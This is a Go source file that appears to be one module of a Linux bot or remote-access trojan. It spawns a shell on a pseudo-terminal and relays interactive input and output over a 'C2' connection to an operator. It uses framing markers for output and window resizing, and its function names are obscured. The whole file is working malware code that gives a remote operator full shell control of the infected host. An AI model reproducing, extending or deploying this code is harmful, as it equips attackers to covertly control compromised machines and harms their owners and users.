//go:build linux

package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// Linux PTY ioctl constants.
// TIOCGPTN  — get slave PTY number from master fd (kernel fills uintptr).
// TIOCSPTLCK — set/clear slave PTY lock (0 = unlocked).
// TIOCSWINSZ — push new winsize struct to the PTY driver.
const (
	ioctlTIOCGPTN   = 0x80045430
	ioctlTIOCSPTLCK = 0x40045431
	ioctlTIOCSWINSZ = 0x5414
)

// winSize mirrors the kernel struct winsize used by TIOCSWINSZ.
// All fields must be in the same order as the kernel ABI.
type winSize struct {
	Rows    uint16
	Cols    uint16
	Xpixels uint16
	Ypixels uint16
}

// lazySylveonResize sends a TIOCSWINSZ ioctl to the master PTY file descriptor,
// causing the kernel to update the terminal dimensions and deliver SIGWINCH
// to the foreground process group in the slave side.
//
// Parameters:
//   - masterFd: file descriptor of the master PTY (from /dev/ptmx)
//   - rows:     new terminal row count
//   - cols:     new terminal column count
//
// Returns: error if the ioctl call fails
func lazySylveonResize(masterFd uintptr, rows, cols uint16) error {
	ws := winSize{Rows: rows, Cols: cols}
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		masterFd,
		ioctlTIOCSWINSZ,
		uintptr(unsafe.Pointer(&ws)),
	)
	if errno != 0 {
		return errno
	}
	return nil
}

// lazySylveon opens a full pseudo-terminal (PTY) shell session and bridges it
// over the supplied C2 net.Conn.
//
// Protocol contract with the C2 operator:
//   - All PTY output arriving from the child is forwarded to conn prefixed with
//     the literal line  "__PTY_OUT__\n"  so the server side can distinguish
//     raw PTY bytes from regular bot protocol messages.
//   - The operator sends terminal input directly (raw bytes written to conn).
//   - To resize the window the operator sends a line of the form
//     "__PTY_RESIZE__ <rows> <cols>\n"; lazySylveon intercepts this marker
//     and calls lazySylveonResize rather than forwarding the bytes to the shell.
//
// Implementation notes:
//  1. /dev/ptmx is opened to obtain a master fd.
//  2. TIOCGPTN retrieves the slave number N → /dev/pts/N path.
//  3. TIOCSPTLCK(0) unlocks the slave so ForkExec can open it.
//  4. The child is started with Setsid=true and Ctty set to the slave fd so it
//     becomes the session leader owning a controlling terminal.
//  5. Two goroutines bridge data bidirectionally; a third watches for resize
//     markers inside the operator→master stream.
//  6. On any read/write failure or child exit the function cleans up and returns.
//
// Parameters:
//   - conn:      active C2 net.Conn (the operator's end)
//   - shellPath: absolute path to the shell binary (e.g. "/bin/bash")
func lazySylveon(conn net.Conn, shellPath string) {
	deoxys("lazySylveon: opening /dev/ptmx for PTY session")

	// ── Step 1: open master PTY ──────────────────────────────────────────────
	masterFile, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
	if err != nil {
		deoxys("lazySylveon: failed to open /dev/ptmx: %v", err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("ptmx open: %v", err))))
		return
	}
	defer masterFile.Close()
	masterFd := masterFile.Fd()

	// ── Step 2: get slave PTY number via TIOCGPTN ────────────────────────────
	var ptyNum uint32
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		masterFd,
		ioctlTIOCGPTN,
		uintptr(unsafe.Pointer(&ptyNum)),
	)
	if errno != 0 {
		deoxys("lazySylveon: TIOCGPTN failed: %v", errno)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("TIOCGPTN: %v", errno))))
		return
	}
	slavePath := fmt.Sprintf("/dev/pts/%d", ptyNum)
	deoxys("lazySylveon: slave PTY path: %s", slavePath)

	// ── Step 3: unlock slave PTY via TIOCSPTLCK(0) ───────────────────────────
	var lockVal int32 = 0
	_, _, errno = syscall.Syscall(
		syscall.SYS_IOCTL,
		masterFd,
		ioctlTIOCSPTLCK,
		uintptr(unsafe.Pointer(&lockVal)),
	)
	if errno != 0 {
		deoxys("lazySylveon: TIOCSPTLCK failed: %v", errno)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("TIOCSPTLCK: %v", errno))))
		return
	}

	// ── Step 4: open slave fd so we can pass it to the child ─────────────────
	slaveFile, err := os.OpenFile(slavePath, os.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		deoxys("lazySylveon: failed to open slave %s: %v", slavePath, err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("slave open: %v", err))))
		return
	}
	slaveFd := int(slaveFile.Fd())

	// ── Step 5: fork child with slave PTY as controlling terminal ─────────────
	// Setsid creates a new session; Ctty promotes the slave to controlling
	// terminal for that session so job-control signals work correctly.
	pid, err := syscall.ForkExec(shellPath, []string{shellPath}, &syscall.ProcAttr{
		Env: os.Environ(),
		Files: []uintptr{
			uintptr(slaveFd), // stdin  → slave
			uintptr(slaveFd), // stdout → slave
			uintptr(slaveFd), // stderr → slave
		},
		Sys: &syscall.SysProcAttr{
			Setsid: true,
			Ctty:   slaveFd,
		},
	})
	// Slave fd is only needed by the child; close our copy immediately.
	slaveFile.Close()
	if err != nil {
		deoxys("lazySylveon: ForkExec failed: %v", err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("fork: %v", err))))
		return
	}
	deoxys("lazySylveon: child shell PID %d started", pid)
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("PTY shell started (PID %d)", pid))))

	// done is closed when either side terminates to unblock all goroutines.
	done := make(chan struct{})
	closeOnce := func() {
		select {
		case <-done:
		default:
			close(done)
		}
	}

	// ── Goroutine A: master PTY → conn ────────────────────────────────────────
	// Reads raw bytes from the master (child's output) and forwards them to
	// the operator with the "__PTY_OUT__\n" sentinel prefix so the server can
	// frame them correctly in the UI.
	guardedGo("lazySylveon/masterToConn", func() {
		defer closeOnce()
		buf := make([]byte, 4096)
		for {
			n, err := masterFile.Read(buf)
			if n > 0 {
				// Prefix each chunk so the C2 server can identify PTY output.
				header := []byte("__PTY_OUT__\n")
				conn.Write(header)
				conn.Write(buf[:n])
			}
			if err != nil {
				if err != io.EOF {
					deoxys("lazySylveon/masterToConn: read error: %v", err)
				}
				return
			}
			select {
			case <-done:
				return
			default:
			}
		}
	})

	// ── Goroutine B: conn → master PTY (with resize intercept) ───────────────
	// Reads operator input from conn.  Lines matching "__PTY_RESIZE__ R C\n"
	// are intercepted and forwarded to lazySylveonResize instead of the shell.
	// All other bytes are written verbatim to the master PTY fd.
	guardedGo("lazySylveon/connToMaster", func() {
		defer closeOnce()
		// We need to scan for resize markers while also passing binary input
		// through as raw bytes.  We use a simple accumulation strategy: collect
		// bytes until we see a '\n', check for the marker, then act.
		var lineBuf []byte
		raw := make([]byte, 512)
		for {
			select {
			case <-done:
				return
			default:
			}
			n, err := conn.Read(raw)
			if n > 0 {
				chunk := raw[:n]
				// Walk the chunk byte-by-byte looking for newlines so we can
				// intercept resize commands without buffering the entire stream.
				for i := 0; i < len(chunk); i++ {
					b := chunk[i]
					lineBuf = append(lineBuf, b)
					if b == '\n' {
						line := string(lineBuf)
						lineBuf = lineBuf[:0]
						if strings.HasPrefix(line, "__PTY_RESIZE__ ") {
							// Parse "__PTY_RESIZE__ <rows> <cols>"
							parts := strings.Fields(strings.TrimPrefix(line, "__PTY_RESIZE__ "))
							if len(parts) >= 2 {
								rows64, err1 := strconv.ParseUint(parts[0], 10, 16)
								cols64, err2 := strconv.ParseUint(parts[1], 10, 16)
								if err1 == nil && err2 == nil {
									if resErr := lazySylveonResize(masterFd, uint16(rows64), uint16(cols64)); resErr != nil {
										deoxys("lazySylveon: TIOCSWINSZ error: %v", resErr)
									} else {
										deoxys("lazySylveon: resized to %dx%d", rows64, cols64)
									}
								}
							}
							// Do NOT forward the resize marker to the shell.
						} else {
							// Regular input — write to master PTY.
							masterFile.Write([]byte(line))
						}
					}
				}
			}
			if err != nil {
				if err != io.EOF {
					deoxys("lazySylveon/connToMaster: read error: %v", err)
				}
				return
			}
		}
	})

	// ── Goroutine C: reap child process ──────────────────────────────────────
	// Wait4 blocks until the child exits, then signals the other goroutines.
	guardedGo("lazySylveon/reapChild", func() {
		defer closeOnce()
		var wstatus syscall.WaitStatus
		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			deoxys("lazySylveon/reapChild: Wait4 error: %v", err)
		} else {
			deoxys("lazySylveon/reapChild: child PID %d exited, status=%v", pid, wstatus)
		}
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("PTY shell exited (PID %d)", pid))))
	})

	// Block until any goroutine signals completion.
	<-done
	deoxys("lazySylveon: session ended for PID %d", pid)
}

